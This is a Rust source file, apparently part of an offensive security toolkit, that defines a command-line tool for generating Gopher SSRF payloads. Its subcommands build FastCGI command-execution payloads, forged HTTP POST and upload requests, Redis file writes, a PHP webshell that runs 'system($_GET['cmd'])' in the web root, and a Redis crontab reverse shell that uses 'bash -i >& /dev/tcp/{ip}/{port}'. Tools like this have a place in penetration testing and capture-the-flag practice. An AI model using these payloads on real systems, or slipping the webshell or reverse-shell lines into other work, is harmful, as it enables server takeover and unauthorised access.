//! @alias: gop
//! @about: Generate Gopher SSRF payload

use anyhow::{anyhow, Result};
use clap::{Parser, Subcommand};

use crate::CmdExecute;

mod fastcgi_exp;
mod http_exp;
mod redis_exp;
mod utils;

pub use fastcgi_exp::gopher_fastcgi_exp;
pub use http_exp::{gopher_http_post_exp, gopher_http_upload_exp};
pub use redis_exp::gopher_redis_write_exp;
pub use utils::query_escape;

/// Generate Gopher SSRF payload
#[derive(Debug, Parser)]
#[clap(name = "gopher")]
pub struct Cmd {
    /// URL encode count
    #[arg(short = 'e', long, default_value = "0", global = true)]
    pub urlencode: u32,

    #[command(subcommand)]
    pub command: SubCmd,
}

#[derive(Debug, Subcommand)]
pub enum SubCmd {
    /// Generate FastCGI exploit payload via Gopher
    #[clap(alias = "fcgi")]
    Fastcgi {
        /// Target address (host:port)
        #[arg(short, long)]
        target: String,

        /// PHP file to execute
        #[arg(short, long, default_value = "/usr/share/php/PEAR.php")]
        filename: String,

        /// Command to execute
        #[arg(short, long, default_value = "id")]
        command: String,
    },

    /// Generate HTTP POST request via Gopher
    Post {
        /// Target URL
        #[arg(short, long)]
        target: String,

        /// POST data in key=value format, can be specified multiple times
        #[arg(short, long = "data", value_parser = parse_key_value)]
        data: Vec<(String, String)>,
    },

    /// Generate HTTP file upload request via Gopher
    Upload {
        /// Target URL
        #[arg(short, long)]
        target: String,

        /// Form data in key=value format (prefix @file for file upload)
        #[arg(short, long = "data", value_parser = parse_key_value)]
        data: Vec<(String, String)>,
    },

    /// Generate Redis write file payload via Gopher
    Write {
        /// Target address (host:port)
        #[arg(short, long)]
        target: String,

        /// Filename to write
        #[arg(short = 'n', long, default_value = "root")]
        filename: String,

        /// Directory path to write
        #[arg(short = 'p', long, default_value = "/var/www/html/")]
        filepath: String,

        /// Content to write
        #[arg(short, long, default_value = "Gopher Exp Redis Write File")]
        content: String,
    },

    /// Generate Redis webshell payload via Gopher
    Webshell {
        /// Target address (host:port)
        #[arg(short, long)]
        target: String,

        /// Webshell filename
        #[arg(short = 'n', long, default_value = "virzz.php")]
        filename: String,

        /// Directory path
        #[arg(short = 'p', long, default_value = "/var/www/html/")]
        filepath: String,

        /// Webshell content
        #[arg(short, long, default_value = "\r\n<?php system($_GET['cmd']);?>\r\n")]
        content: String,
    },

    /// Generate Redis crontab reverse shell payload via Gopher
    Reverse {
        /// Target address (host:port)
        #[arg(short, long)]
        target: String,

        /// Crontab filename
        #[arg(short = 'n', long, default_value = "root")]
        filename: String,

        /// Crontab directory
        #[arg(short = 'p', long, default_value = "/var/spool/cron/")]
        filepath: String,

        /// Reverse shell address (ip:port)
        #[arg(short, long)]
        reverse: String,
    },
}

fn parse_key_value(s: &str) -> Result<(String, String), String> {
    let pos = s.find('=').ok_or_else(|| format!("invalid KEY=value: no `=` found in `{s}`"))?;
    Ok((s[..pos].to_string(), s[pos + 1..].to_string()))
}

impl CmdExecute for Cmd {
    async fn execute(&self) -> Result<()> {
        let result = match &self.command {
            SubCmd::Fastcgi {
                target,
                filename,
                command,
            } => gopher_fastcgi_exp(target, command, filename)?,

            SubCmd::Post { target, data } => {
                let (host, path) = parse_url(target)?;
                let data_map: std::collections::HashMap<String, String> = data.iter().cloned().collect();
                gopher_http_post_exp(&host, &path, &data_map)?
            }

            SubCmd::Upload { target, data } => {
                let (host, path) = parse_url(target)?;
                let data_map: std::collections::HashMap<String, String> = data.iter().cloned().collect();
                gopher_http_upload_exp(&host, &path, &data_map)?
            }

            SubCmd::Write {
                target,
                filename,
                filepath,
                content,
            } => gopher_redis_write_exp(target, filepath, filename, content)?,

            SubCmd::Webshell {
                target,
                filename,
                filepath,
                content,
            } => gopher_redis_write_exp(target, filepath, filename, content)?,

            SubCmd::Reverse {
                target,
                filename,
                filepath,
                reverse,
            } => {
                let (ip, port) = parse_addr(reverse)?;
                let content = format!(
                    "\n\n\n\n*/1 * * * * sh -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"\n\n\n\n"
                );
                gopher_redis_write_exp(target, filepath, filename, &content)?
            }
        };

        // Apply URL encoding
        let output = query_escape(&result, self.urlencode as usize);
        println!("{output}");
        Ok(())
    }
}

/// Parse URL to extract host and path
fn parse_url(target: &str) -> Result<(String, String)> {
    let url_str = if target.starts_with("http") {
        target.to_string()
    } else {
        format!("http://{target}")
    };

    let url = url::Url::parse(&url_str)?;
    let host = url
        .host_str()
        .ok_or_else(|| anyhow!("Invalid URL: no host"))?;
    let port = url.port().unwrap_or(80);
    let host_port = if port == 80 {
        host.to_string()
    } else {
        format!("{host}:{port}")
    };
    let path = url.path().to_string();
    let path = if path.is_empty() { "/".to_string() } else { path };

    Ok((host_port, path))
}

/// Parse address string like "ip:port"
fn parse_addr(addr: &str) -> Result<(String, u16)> {
    let parts: Vec<&str> = addr.rsplitn(2, ':').collect();
    if parts.len() != 2 {
        return Err(anyhow!("Invalid address format, expected ip:port"));
    }
    let port: u16 = parts[0].parse()?;
    let ip = parts[1].to_string();
    Ok((ip, port))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_gopher_redis_write() {
        let payload = gopher_redis_write_exp("127.0.0.1:80", "/var/www/html/", "xxx.php", "Hello world").unwrap();
        println!("{payload}");
        assert!(payload.starts_with("gopher://"));
    }

    #[test]
    fn test_gopher_fastcgi() {
        let payload = gopher_fastcgi_exp("127.0.0.1:80", "id", "/usr/share/php/PEAR.php").unwrap();
        println!("{payload}");
        assert!(payload.starts_with("gopher://"));
    }

    #[test]
    fn test_gopher_http_post() {
        let mut data = std::collections::HashMap::new();
        data.insert("key".to_string(), "value".to_string());
        let payload = gopher_http_post_exp("127.0.0.1:80", "/", &data).unwrap();
        println!("{payload}");
        assert!(payload.starts_with("gopher://"));
    }
}

